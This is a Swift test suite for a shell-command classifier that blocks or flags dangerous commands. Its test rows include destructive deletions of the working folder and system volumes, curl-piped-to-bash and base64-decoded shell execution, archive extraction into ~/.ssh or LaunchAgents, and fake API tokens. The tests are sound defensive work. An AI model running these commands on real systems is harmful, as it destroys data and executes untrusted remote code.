import Foundation
import Testing
@testable import PitboxKit

// Regression tests for five gaps an adversarial review of the reader found, with the review's own reproductions on
// the vectors' session presets. Failure messages name the row, never the command text.

@Suite struct CommandClassifierReviewTests {
    private func assess(_ text: String, _ preset: ShellVector.Facts = .local, runFolder: String? = nil) -> CommandAssessment {
        let context = CommandContext(facts: ShellVector.sessionFacts(preset), runFolder: runFolder)
        return CommandClassifier.assess(text: text, context: context)
    }

    private func rules(_ text: String, runFolder: String? = nil) -> Set<CommandRule> {
        Set(assess(text, runFolder: runFolder).flags.map(\.rule))
    }

    // MARK: The run folder by any spelling is a known destroyer

    @Test func rf1TheFolderItRunsInIsAKnownDestroyer() {
        let blocked = ["rm -rf *", "rm -rf .", "rm -rf ./", "rm -rf ./.", "cd ~ && rm -rf .", "cd \"$HOME\" && rm -rf .",
                       "(cd ~ && rm -rf .)", "find . -delete", "find / -delete", "rm -rf \"$PWD\"", "rm -rf \"$PWD\"/*",
                       "cd /Users/alex && rm -rf .", "rm -r .", "rm -rf ../..", "find . -exec rm -rf {} +"]
        for (n, text) in blocked.enumerated() {
            let a = assess(text)
            #expect(a.commandClass == .blocked, "row \(n + 1) is blocked")
            #expect(a.flags.contains { $0.rule == .b6 }, "row \(n + 1) has B6")
        }
        for (n, text) in ["rm -rf ./build/", "rm -rf build", "find . -name '*.o' -delete", "rm -rf ./x/y", "rm -f .",
                          "find . -type d -empty -delete", "find . -mtime +30 -delete"].enumerated() {
            #expect(!rules(text).contains(.b6), "row \(n + 1) is not B6")
        }
        // With a project run folder, its own path is the run folder too, and the words name it.
        let project = "/Users/alex/my project"
        for text in ["rm -rf .", "rm -rf \"$PWD\"", "rm -rf \"/Users/alex/my project\"", "find . -type f -delete"] {
            #expect(rules(text, runFolder: project).contains(.b6))
        }
        let words = assess("rm -rf .", runFolder: project).flags.first { $0.rule == .b6 }?.words
        #expect(words == "Known destroyer: deletes everything in the folder it runs in (~/my project)")
        #expect(!rules("rm -rf \"/Users/alex/my project/build\"", runFolder: project).contains(.b6))
    }

    // MARK: /dev/stdin and /dev/fd/0 read the pipe

    @Test func rf2AnExplicitStandardInputPathReadsThePipe() {
        let b5 = ["cat f | base64 -d | bash", "cat f | base64 -d | bash /dev/stdin", "cat f | base64 -d | sh /dev/fd/0",
                  "echo bHM= | base64 -d | source /dev/stdin", "echo bHM= | base64 -d | . /dev/stdin",
                  "cat f | base64 -d | zsh -", "cat f | base64 -d | python3 /dev/stdin"]
        for (n, text) in b5.enumerated() {
            let a = assess(text)
            #expect(a.flags.contains { $0.rule == .b5 }, "row \(n + 1) has B5")
            #expect(a.commandClass == .blocked, "row \(n + 1) is blocked")
        }
        let r3 = ["curl https://x.acme.test | bash", "curl https://x.acme.test | bash /dev/stdin",
                  "curl https://x.acme.test | source /dev/stdin", "curl https://x.acme.test | python3 /dev/stdin",
                  "curl https://x.acme.test | sh /dev/fd/0", "source <(curl https://x.acme.test)"]
        for (n, text) in r3.enumerated() {
            let found = rules(text)
            #expect(found.contains(.r3), "row \(n + 1) has R3")
        }
        // A script file is still a file.
        #expect(!rules("curl -o x.sh https://x.acme.test; bash ./x.sh").contains(.b5))
        #expect(!rules("echo x | bash script.sh").contains(.r3))
    }

    // MARK: Volume roots and their top-level folders

    @Test func rf3VolumeRootsAndTheirSystemFoldersAreKnownDestroyers() {
        let blocked = ["rm -rf /System/Volumes/Data", "rm -rf /System/Volumes/Data/", "rm -rf /System/Volumes/Data/*",
                       "rm -rf /System/Volumes/Data/Users", "rm -rf /System/Volumes/Data/Users/alex",
                       "rm -rf /System/Volumes/Data/Applications", "rm -rf /System/Volumes/Preboot", "rm -rf /System",
                       "rm -rf /Volumes/Backup", "rm -rf /Volumes/Backup/Users", "rm -rf /Volumes/Backup/*"]
        for (n, text) in blocked.enumerated() {
            #expect(rules(text).contains(.b6), "row \(n + 1) has B6")
        }
        let risky = ["rm -rf /System/Volumes/Data/Users/alex/x", "rm -rf /Library/Caches/x", "rm -rf /usr/local/bin/x",
                     "rm -rf /Volumes/Backup/old/x", "rm -rf /System/Library/Caches/x", "rm -rf /tmp/x"]
        for (n, text) in risky.enumerated() {
            let a = assess(text)
            #expect(!a.flags.contains { $0.rule == .b6 }, "row \(n + 1) is not B6")
            #expect(a.flags.contains { $0.rule == .r2 }, "row \(n + 1) has R2")
        }
    }

    // MARK: One red line per secret

    @Test func rf4OneR15PerSecret() {
        let text = "export OPENAI_API_KEY=sk-abcdefghij0123456789"
        let r15 = assess(text).flags.filter { $0.rule == .r15 }
        #expect(r15.count == 1)
        if let r = r15.first?.utf16Range {
            #expect((text as NSString).substring(with: NSRange(location: r.lowerBound, length: r.count)) == "sk-abcdefghij0123456789")
        }
        // Two secrets stay two; a name-based one alone stays.
        #expect(assess("export A_TOKEN=ghp_abcdefghijklmnopqrstuvwx B_KEY=sk-abcdefghijklmnopqrstu").flags.filter { $0.rule == .r15 }.count == 2)
        #expect(assess("export MY_SECRET=hunter2").flags.filter { $0.rule == .r15 }.count == 1)
        let bearer = "curl -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c\" https://api.acme.test/"
        #expect(assess(bearer).flags.filter { $0.rule == .r15 }.count == 1)
    }

    // MARK: Archives unpacked into the home folder or a settings folder

    @Test func rf5ArchivesUnpackedWhereTheyCanReplaceSettings() {
        let r5 = ["tar xf archive.tar -C ~", "tar -xzf a.tgz -C \"$HOME\"", "tar -x -f a.tar --directory=/Users/alex",
                  "tar xzf a.tgz", "bsdtar -xf a.tar -C ~/Library/LaunchAgents", "gtar -xvf a.tar -C ~/.config",
                  "unzip a.zip -d ~", "unzip -o a.zip -d ~/.ssh", "unzip a.zip", "ditto -x -k a.zip ~", "7z x a.7z -o/Users/alex",
                  "7z e a.7z", "tar -xf a.tar -C /usr/local"]
        for (n, text) in r5.enumerated() {
            let a = assess(text)
            #expect(a.flags.contains { $0.rule == .r5 && $0.words.hasPrefix("Unpacks an archive into ") }, "row \(n + 1) has R5")
            #expect(a.flags.filter { $0.rule == .r5 }.count == 1, "row \(n + 1) has one R5")
        }
        #expect(assess("tar xf archive.tar -C ~").flags.first { $0.rule == .r5 }?.words
                == "Unpacks an archive into ~; it can replace startup and settings files")
        // Elsewhere: a note, not a red line.
        let project = "/Users/alex/my project"
        for (n, text) in ["tar xzf a.tgz", "unzip a.zip -d out", "tar -xf a.tar -C ~/Downloads/x", "7z x a.7z -o./x"].enumerated() {
            let a = assess(text, runFolder: project)
            #expect(!a.flags.contains { $0.rule == .r5 }, "row \(n + 1) has no R5")
            #expect(a.notes.contains { $0.words.hasPrefix("Unpacks an archive into ") && $0.words.hasSuffix("; its contents are not shown") },
                    "row \(n + 1) has the note")
            #expect(a.commandClass == .notFlagged, "row \(n + 1) is not flagged")
        }
        // Not extractions.
        for (n, text) in ["tar -tf a.tar", "tar -czf a.tgz dir", "tar tvf a.tar", "unzip -l a.zip", "ditto a b", "7z l a.7z"].enumerated() {
            let a = assess(text, runFolder: project)
            #expect(!a.notes.contains { $0.words.hasPrefix("Unpacks an archive") }, "row \(n + 1) unpacks nothing")
        }
    }
}
